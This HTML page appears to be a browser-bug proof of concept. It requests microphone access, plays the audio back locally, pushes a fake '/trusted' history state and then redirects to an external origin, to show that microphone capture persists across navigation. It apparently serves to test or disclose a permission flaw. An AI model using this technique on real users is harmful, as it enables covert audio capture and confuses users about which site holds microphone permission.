<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Microphone Permission Navigation PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  font-family: system-ui;
  background:#f5f5f7;
  margin:0;
}
#box {
  max-width:520px;
  margin:60px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);
}
button {
  width:100%;
  padding:12px;
  font-size:16px;
  border-radius:10px;
  border:none;
  background:#007aff;
  color:#fff;
  margin-top:12px;
}
pre {
  margin-top:12px;
  background:#111;
  color:#0f0;
  padding:10px;
  font-size:12px;
  max-height:200px;
  overflow:auto;
}
</style>
</head>

<body>

<div id="box">
  <h2>Microphone Permission Navigation Test</h2>
  <p>
    1. Tap start<br>
    2. Allow microphone<br>
    3. Observe audio persists across navigation & history changes
  </p>

  <button id="start">Start Test</button>
  <pre id="log"></pre>
</div>

<script>
const logEl = document.getElementById('log');
const log = m => logEl.textContent += m + "\n";

let stream;
let ctx;

document.getElementById('start').onclick = async () => {
  log("Requesting microphone…");

  try {
    stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    log("Microphone granted");

    ctx = new AudioContext();
    const src = ctx.createMediaStreamSource(stream);
    src.connect(ctx.destination);
    log("Microphone playback active");

    // Simulate trusted in-app navigation
    setTimeout(() => {
      log("Pushing trusted history state");
      history.pushState({}, '', '/trusted');
      document.getElementById('box').style.display = 'block';
    }, 200);

  } catch (e) {
    log("Microphone denied");
  }
};

// Trigger navigation after page lifecycle events
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        log("Redirecting to external origin…");
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});
</script>

</body>
</html>
